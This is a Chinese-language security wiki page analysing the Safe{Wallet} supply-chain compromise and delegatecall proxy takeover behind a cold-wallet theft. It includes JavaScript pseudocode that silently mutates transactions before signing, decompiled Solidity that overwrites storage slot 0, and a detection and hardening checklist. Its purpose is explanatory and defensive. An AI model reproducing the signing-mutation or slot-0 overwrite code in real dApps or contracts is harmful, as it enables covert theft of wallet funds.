# Web3 签名工作流妥协 & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## 概览

一次冷钱包盗窃链结合了 **对 Safe{Wallet} web UI 的供应链妥协** 与一个 **在链上的 delegatecall 原语，覆盖了代理的 implementation 指针（slot 0）**。主要要点：

- 如果一个 dApp 能在签名路径中注入代码，它可以让签名者生成对攻击者选择字段的有效 **EIP-712 签名**，同时恢复原始 UI 数据，使其他签名者毫不知情。
- Safe 代理在 **storage slot 0** 存储 `masterCopy`（implementation）。对一个写入 slot 0 的合约执行 delegatecall 实际上会把 Safe “升级”为攻击者的逻辑，从而获得对钱包的完全控制。

## 链下：在 Safe{Wallet} 中针对性的签名变异

一个被篡改的 Safe bundle (`_app-*.js`) 有选择地针对特定的 Safe + signer 地址发起攻击。注入的逻辑在签名调用之前立即执行：
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### 攻击属性
- **Context-gated**: 对受害者 Safes/signers 的硬编码白名单减少了噪声并降低了被发现的概率。
- **Last-moment mutation**: 字段 (`to`, `data`, `operation`, gas) 在 `signTransaction` 之前被立即覆盖，然后恢复，因此 UI 中的提案载荷看起来良性，而签名实际上匹配攻击者的载荷。
- **EIP-712 opacity**: 钱包显示了结构化数据，但没有解码嵌套的 calldata 或突出显示 `operation = delegatecall`，使得被篡改的消息实际上被盲签名。

### Gateway validation relevance
Safe 的提案会提交到 **Safe Client Gateway**。在强化检查之前，该网关可能会接受一份提案：如果 UI 在签名后重写了字段，`safeTxHash`/签名可能对应于与 JSON 正文不同的字段。事件发生后，该网关现在会拒绝哈希/签名与提交的交易不匹配的提案。任何 signing-orchestration API 也应强制实施类似的服务端哈希校验。

## 链上：Delegatecall proxy takeover via slot collision

Safe proxies 将 `masterCopy` 保存在 **storage slot 0**，并将所有逻辑委托给它。因为 Safe 支持 **`operation = 1` (delegatecall)**，任何签名的交易都可以指向任意合约并在代理的存储上下文中执行其代码。

攻击者合约模仿 ERC-20 的 `transfer(address,uint256)`，但实际上将 `_to` 写入了 slot 0：
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
执行路径：
1. 受害者签署 `execTransaction`，其中 `operation = delegatecall`、`to = attackerContract`、`data = transfer(newImpl, 0)`。
2. Safe masterCopy 验证这些参数上的签名。
3. Proxy 对 `attackerContract` 执行 delegatecall；`transfer` 函数体写入 slot 0。
4. Slot 0 (`masterCopy`) 现在指向攻击者控制的逻辑 → **完全接管钱包并抽干资金**。

## 检测与加固清单

- **UI 完整性**：pin JS assets / SRI；监控 bundle 差异；将签名 UI 视为信任边界的一部分。
- **签署时验证**：使用支持 **EIP-712 clear-signing** 的硬件钱包；明确渲染 `operation` 并解码嵌套 calldata。当 `operation = 1` 时拒绝签名，除非政策允许。
- **服务器端哈希校验**：转发提案的 gateways/services 必须重新计算 `safeTxHash` 并验证签名与提交字段匹配。
- **策略/允许列表**：对 `to`、selectors、资产类型的预检规则，除经审查的流程外禁止 delegatecall。在广播完全签名的交易之前要求内部策略服务批准。
- **合约设计**：避免在 multisig/treasury 钱包中暴露任意 delegatecall，除非确有必要。将升级指针放置在非 slot 0 的位置，或通过显式的升级逻辑和访问控制进行保护。
- **监控**：对持有金库资金的钱包执行 delegatecall 的操作发送告警，以及对将 `operation` 从典型 `call` 模式更改的提案发出警报。

## References

- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
